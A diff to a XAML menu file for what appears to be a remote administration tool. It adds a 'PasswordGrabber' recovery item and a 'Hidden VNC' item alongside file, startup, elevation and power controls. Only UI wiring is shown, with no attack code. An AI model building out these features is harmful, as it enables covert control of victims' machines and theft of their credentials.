@@ -283,15 +283,27 @@
                                 <MenuItem Header="File Manager" Click="FileManager_Click"/>
                                 <MenuItem Header="Visit Website" Click="VisitWebsite_Click"/>
                                 <MenuItem Header="Startup Manager" Click="StartUpManager_Click"/>
-                                    <MenuItem Header="Task Scheduler" Click="TaskScheduler_Click"/>
+                                <MenuItem Header="Task Scheduler" Click="TaskScheduler_Click"/>
                                 <MenuItem Header="Request Elevation" Click="RequestElevation_Click"/>
                                 </MenuItem>
+                                <Separator/>
+                                <MenuItem Header="Recovery">
+                                    <MenuItem Header="PasswordGrabber" Click="Password_Click"/>
+                                </MenuItem> 
                                 <Separator/>
                                 <MenuItem Header="Power Options">
                                     <MenuItem Header="Restart" Click="PowerRestart_Click"/>
                                     <MenuItem Header="Shutdown" Click="PowerShutdown_Click"/>
                                     <MenuItem Header="Sleep" Click="PowerSleep_Click"/>
                                     <MenuItem Header="Log Off" Click="PowerLogOff_Click"/>
+                                </MenuItem>
+                                <Separator/>
+                                <MenuItem Header="Misc Tools">
+                                    <MenuItem Header="TODO Hidden VNC" Click="MenuItem_OpenHvnc_Click">
+                                        <MenuItem.Icon>
+                                            <TextBlock Text="🖥️" FontSize="14"/>
+                                        </MenuItem.Icon>
+                                    </MenuItem>
                                 </MenuItem>
                                 <Separator/>
                                 <MenuItem Header="Disconnect" Click="Disconnect_Click"/>
